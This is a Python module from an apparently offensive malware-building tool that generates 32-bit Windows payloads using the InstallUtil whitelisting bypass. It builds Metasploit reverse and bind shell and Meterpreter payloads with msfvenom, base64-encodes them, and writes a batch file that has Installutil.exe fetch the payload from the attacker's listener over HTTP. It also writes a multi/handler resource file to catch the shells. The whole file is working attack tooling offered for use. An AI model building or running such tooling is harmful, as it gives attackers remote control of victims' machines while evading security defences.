#! /usr/bin/env python3
##INstallUtil Payloads
import os
import importlib
from importlib import util

spec = importlib.util.find_spec('.subserv', package='lib')
m = spec.loader.load_module()
customfolder = m.loc + "/aMALgamation/current/InstallutilCustom/"
if not os.path.exists(customfolder):
    os.makedirs(customfolder)

##  32 bit InstallUtil custom payload
def installutil():
    os.system("clear")
    print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\t***MALWARE TIME!!!!!***\n\n" + m.bcolors.ENDC)


    while (1):
        print(m.bcolors.BLUE + "\t*******************************************************************" + m.bcolors.ENDC)
        print(m.bcolors.BOLD + m.bcolors.GREEN + """
        *******************************************************************
          _   _   _   _   _   _   _   _   _   _   _     _   _   _   _  
         / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \   / \ / \ / \ / \ 
        ( I | n | s | t | a | l | l | U | t | i | l ) ( M | e | n | u )
         \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ 
              """ + m.bcolors.ENDC)

        print(
           m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
        print("\t(1)\tGenerate Windows 32bit payload")
        print("\t(99)\tGo back to the Custom Malware Menu")
        print(
            m.bcolors.GREEN + m.bcolors.BOLD + "\tAll payloads and RC files will be put in:" + m.bcolors.ERROR + customfolder + m.bcolors.ENDC)
        print(m.bcolors.BLUE + "\t*******************************************************************" + m.bcolors.ENDC)

        options = input("\nW4@+ Ma1w@r3 R U W@^t1ng Brobi-Wan: ")
        if options == "1":
            installu()
        elif options == "99":
            os.system("clear")
            break
        else:
            input("You must be a Pats Fan! Come on pick something... ")
##  regsrv32 32 bit Meterpreter DLL EVADE
def installu():
  global customfolder
  payload = "null"
  bfilename = "null"
  dfilename = "null"
  batfile = "null"
  port = "null"
  a = "windows/shell/bind_tcp"
  b = "windows/shell/reverse_tcp"
  c = "windows/shell/reverse_tcp_dns"
  d = "windows/shell/reverse_udp"
  e = "windows/shell_bind_tcp"
  f = "windows/shell_reverse_tcp"
  a1 = "windows/meterpreter/bind_tcp"
  b1 = "windows/meterpreter/reverse_http"
  c1 = "windows/meterpreter/reverse_https"
  d1 = "windows/meterpreter/reverse_tcp"
  e1 = "windows/meterpreter/reverse_tcp_dns"
  a2 = "windows/meterpreter_bind_tcp"
  b2 = "windows/meterpreter_reverse_http"
  c2 = "windows/meterpreter_reverse_https"
  d2 = "windows/meterpreter_reverse_tcp"
  print(
      m.bcolors.ERROR + m.bcolors.BOLD + "\tAt any time you can go back to the menu by inputting q or Q" + m.bcolors.ENDC)
  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tPayload Options\n\n" + m.bcolors.ENDC)
  print(m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
  print("""
   Best Payloads to use
    (a) ---%s
    (b) ---%s
    (c) ---%s
    (d) ---%s
    (e) ---%s
    (f) ---%s
    (a1)---%s
    (b1)---%s
    (c1)---%s
    (d1)---%s
    (e1)---%s
    (a2)---%s
    (b2)---%s
    (c2)---%s
    (d2)---%s

  """ %(a, b, c, d, e, f, a1, b1, c1, d1, e1, a2, b2, c2, d2))

  if (payload == "null"):
    print(
        "Please pick a payload type that meets your needs. Use the letter/number to pick the payload.. Example 'a' for windows/shell/bind_tcp\n")
    payload = input("\tEnter payload type:  ") or d2
    if payload == 'a':
        payload = a
    elif payload == 'b':
        payload = b
    elif payload == 'c':
        payload = c
    elif payload == 'd':
        payload = d
    elif payload == 'e':
        payload = e
    elif payload == 'f':
        payload = f
    elif payload == 'a1':
        payload = a1
    elif payload == 'b1':
        payload = b1
    elif payload == 'c1':
        payload = c1
    elif payload == 'd1':
        payload = d1
    elif payload == 'e1':
        payload = e1
    elif payload == 'a2':
        payload = a2
    elif payload == 'b2':
        payload = b2
    elif payload == 'c2':
        payload = c2
    elif payload == 'd2':
        payload = d2
    elif payload == 'q' or 'Q':
        return
    else:
        print(m.bcolors.ERROR + m.bcolors.BOLD + m.bcolors.UNDERLINE +"\t********Invalid payload***********" + m.bcolors.ENDC)

  print("\tYour Payload is: %s" %(payload))
  if (port == "null"):
      port = input("\tWhat Port are you wanting to use?:")

      if port == 'q':
          return
      elif port == 'Q':
          return
      else:
          print("\tYour port is: " + port)
  if (bfilename == "null"):
      bfilename = input("\tWhat is the name of your base64 payload file?:")

      if bfilename == 'q':
          return
      elif bfilename == 'Q':
          return
      else:
          print("\tBase64 payload  name set to: " + bfilename)
  if (dfilename == "null"):
      dfilename = input("\tWhat is the name of your dll payload file?:")

      if dfilename == 'q':
          return
      elif dfilename == 'Q':
          return
      else:
          print("\tDll file name set to: " + dfilename)
  if (batfile == "null"):
      batfile = input("\tWhat is the name of your batch payload file?:")

      if batfile == 'q':
          return
      elif batfile == 'Q':
          return
      else:
          print("\tBatch file name set to: " + batfile)


  
  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the  InstallUtil  Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating  32bit Base64 payload ------- Named: " + bfilename)

  os.system("msfvenom -p " + payload + " CMD=calc.exe LHOST=" + m.listener_ip + " LPORT=" + port + " --platform win -a x86 EXITFUNC=thread -f raw  | base64 >" + customfolder + bfilename  + ".b64")


  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 32 bit InstallUtil SHELL BAT file...")
  SHELLINST_bat_file = open(customfolder + batfile + ".bat", "w")
  SHELLINST_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\Framework\v4.0.30319\Installutil.exe /u /f=http://"+m.listener_ip+r"/"+ bfilename +".b64 " + dfilename + ".dll")
  SHELLINST_bat_file.close()

  print("\tMoving files!!")
  os.system("cp ./src/installme_x86.dll " + customfolder + dfilename + ".dll")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating MSF Resource File...")
  msf_resource_file = open(customfolder + bfilename + ".rc", "w")
  msf_resource_file.write("""use multi/handler
  set payload %s
  set LHOST %s
  set LPORT %s
  set ExitOnSession false
  exploit -j
  """ % (payload, m.listener_ip, port))
